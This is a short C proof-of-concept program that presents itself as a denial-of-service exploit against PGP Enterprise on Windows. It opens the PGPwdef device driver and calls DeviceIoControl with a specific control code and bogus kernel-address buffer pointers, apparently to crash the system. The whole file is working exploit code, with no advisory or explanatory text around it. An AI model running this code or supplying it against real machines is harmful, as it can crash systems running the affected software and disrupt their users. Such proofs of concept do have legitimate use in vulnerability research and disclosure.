#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
	HANDLE hDevice;	
	DWORD Dummy;	
	
	system("cls");
	printf("\n .:: PGP Enterprise DoS Proof of Concept ::.\n");

	hDevice = CreateFileA("\\\\.\\PGPwdef",
						0,
						FILE_SHARE_READ | FILE_SHARE_WRITE,
						NULL,
						OPEN_EXISTING,
						0,
						NULL);

	if (hDevice == INVALID_HANDLE_VALUE)
	{
		printf("\n Unable to Open PGPwded Device Driver\n");
		return EXIT_FAILURE;
	}

	DeviceIoControl(hDevice, 0x80022038,(LPVOID) 0x80000001, 0, (LPVOID) 0x80000002, 0, &Dummy, (LPOVERLAPPED)NULL);

	return EXIT_SUCCESS;
}
